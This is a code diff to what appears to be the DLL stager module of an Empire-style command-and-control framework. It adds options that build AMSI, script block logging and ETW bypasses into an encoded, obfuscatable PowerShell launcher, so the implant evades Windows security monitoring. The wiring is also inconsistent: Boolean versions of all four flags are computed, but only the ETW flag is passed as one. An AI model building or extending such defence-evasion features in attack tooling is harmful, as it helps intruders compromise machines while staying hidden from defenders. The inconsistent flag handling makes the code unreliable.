@@ -76,6 +76,26 @@ class Stager(object):
                 'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                 'Required'      :   False,
                 'Value'         :   r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ScriptLogBypass': {
+                'Description': 'Include cobbr\'s Script Block Log Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'ETWBypass': {
+                'Description': 'Include tandasat\'s ETW bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             }
         }
 
@@ -103,6 +123,26 @@ class Stager(object):
         stagerRetries = self.options['StagerRetries']['Value']
         obfuscate = self.options['Obfuscate']['Value']
         obfuscateCommand = self.options['ObfuscateCommand']['Value']
+        scriptLogBypass = self.options['ScriptLogBypass']['Value']
+        AMSIBypass = self.options['AMSIBypass']['Value']
+        AMSIBypass2 = self.options['AMSIBypass2']['Value']
+        ETWBypass = self.options['ETWBypass']['Value']
+
+        scriptLogBypassBool = False
+        if scriptLogBypass.lower() == "true":
+            scriptLogBypassBool = True
+
+        AMSIBypassBool = False
+        if AMSIBypass.lower() == "true":
+            AMSIBypassBool = True
+
+        AMSIBypass2Bool = False
+        if AMSIBypass2.lower() == "true":
+            AMSIBypass2Bool = True
+
+        ETWBypassBool = False
+        if ETWBypass.lower() == 'true':
+            ETWBypassBool =True
 
         if not self.mainMenu.listeners.is_listener_valid(listenerName):
             # not a valid listener, return nothing for the script
@@ -117,7 +157,7 @@ class Stager(object):
                 print(helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager."))
                 return ""
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, scriptLogBypass=scriptLogBypass, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2, ETWBypass=ETWBypassBool)
 
             if launcher == "":
                 print(helpers.color("[!] Error in launcher generation."))
